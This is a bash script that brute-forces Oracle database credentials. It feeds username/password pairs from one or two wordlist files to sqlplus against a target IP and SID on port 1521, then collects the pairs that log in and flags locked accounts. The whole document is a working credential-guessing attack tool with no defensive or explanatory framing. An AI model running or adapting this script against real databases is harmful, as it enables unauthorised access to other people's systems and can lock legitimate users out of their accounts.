#!/bin/bash
ip="$1" && echo $ip
sid="$2" && echo $sid
mode="$3" && echo $mode
passes="$4" ; users="$5"
OLDIFS=$IFS
IFS=,
results=()

if [[ $mode == "one_f" ]] ; then
	INPUT=$passes
	[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
	while IFS="" read -r p || [ -n "$p" ] 
	do
		username=$( echo "$p" | cut -d'/' -f 1 )
		password=$( echo "$p" | cut -d'/' -f 2 )

		if [ -z "$username" ] && [ -z "$password" ] ; then echo -e "Results:\n${results[@]}" && exit 0 ; fi
	 	
		echo "string = $username:$password"

		attempt=$( sqlplus -L $username\/$password\@$ip:1521\/$sid | grep -E -- "logon denied|account is locked|ERROR|Usage" )
	 	
		if echo "$attempt" | grep "account is locked" ; then echo "Credentials are valid but account locked..." && continue
		elif echo "$attempt" | grep -E -- "logon denied|ERROR|Usage" ; then continue
		else echo "Valid credentials" && results+=("valid - $username:$password |")
	 	fi

	done < $INPUT
IFS=$OLDIFS

elif [[ $mode == "two_f" ]] ; then
	[ ! -f $users ] || [ ! -f $passes ] && { echo "User or pass file is invaid." ; exit 99 ; }
	while IFS="" read -r u || [ -n "$u" ] ; do
  	  while IFS="" read -r p || [ -n "$p" ] ; do
		attempt=$( sqlplus -L $u\/$p\@$ip:1521\/$sid | grep -E -- "logon denied|account is locked|ERROR|Usage" )
		
		if echo "$attempt" | grep "account is locked" ; then echo "Credentials are valid but account locked..." && break ; continue
		elif echo "$attempt" | grep -E -- "logon denied|ERROR|Usage" ; then continue
		else echo "Valid credentials" && results+=("valid - $u:$p |") ; break && continue
		fi

	  done < $passes 
	done < $users 

else echo "Invalid mode." && exit 1
fi

echo -e "Results:\n${results[@]}" ; exit 0
